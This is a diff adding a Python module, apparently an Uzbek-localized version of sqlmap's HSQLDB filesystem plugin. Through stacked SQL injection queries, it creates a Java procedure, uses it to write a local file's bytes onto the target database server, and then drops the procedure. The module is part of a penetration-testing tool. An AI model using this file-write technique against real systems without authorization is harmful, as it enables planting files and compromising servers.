@@ -1,0 +1,61 @@
+#!/usr/bin/env python
+
+"""
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
+See the file 'LICENSE' for copying permission
+"""
+
+from lib.core.uzbek import ut
+from lib.core.common import randomStr
+from lib.core.data import kb
+from lib.core.data import logger
+from lib.core.decorators import stackedmethod
+from lib.core.enums import PLACE
+from lib.request import inject
+from lib.core.exception import SqlmapUnsupportedFeatureException
+from plugins.generic.filesystem import Filesystem as GenericFilesystem
+
+class Filesystem(GenericFilesystem):
+    def readFile(self, remoteFile):
+        errMsg = "HSQLDB da fayllarni o'qish mumkin emas"
+        raise SqlmapUnsupportedFeatureException(errMsg)
+
+    @stackedmethod
+    def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
+        func_name = randomStr()
+        max_bytes = 1024 * 1024
+
+        debugMsg = "'%s' JLP protsedurasi yaratilmoqda" % func_name
+        logger.debug(debugMsg)
+
+        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (func_name, max_bytes)
+        addFuncQuery += "LANGUAGE JAVA DETERMINISTIC NO SQL "
+        addFuncQuery += "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
+        inject.goStacked(addFuncQuery)
+
+        fcEncodedList = self.fileEncode(localFile, "hex", True)
+        fcEncodedStr = fcEncodedList[0][2:]
+        fcEncodedStrLen = len(fcEncodedStr)
+
+        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
+            warnMsg = 'inyeksiya GET parametrida va fayl '
+            warnMsg += "yoziladigan o'n oltilik qiymat uzunligi %d " % fcEncodedStrLen
+            warnMsg += 'bayt; bu faylni yozish '
+            warnMsg += "jarayonida xatoga sabab bo'lishi mumkin"
+            logger.warning(warnMsg)
+
+        debugMsg = "%s fayli mazmuni '%s' fayliga chiqarilmoqda" % (fileType, remoteFile)
+        logger.debug(debugMsg)
+
+        # Reference: http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures
+        invokeQuery = "CALL %s('%s', X'%s')" % (func_name, remoteFile, fcEncodedStr)
+        inject.goStacked(invokeQuery)
+
+        logger.debug("ma'lumotlar bazasi boshqaruv tizimi tozalanmoqda")
+
+        delQuery = "DROP PROCEDURE %s" % func_name
+        inject.goStacked(delQuery)
+
+        message = ut("the local file '%s' has been written on the back-end DBMS", "mahalliy '%s' fayli DBMS ga yozildi,") % localFile
+        message += ut("file system ('%s')", "fayl tizimiga ('%s')") % remoteFile
+        logger.info(message)
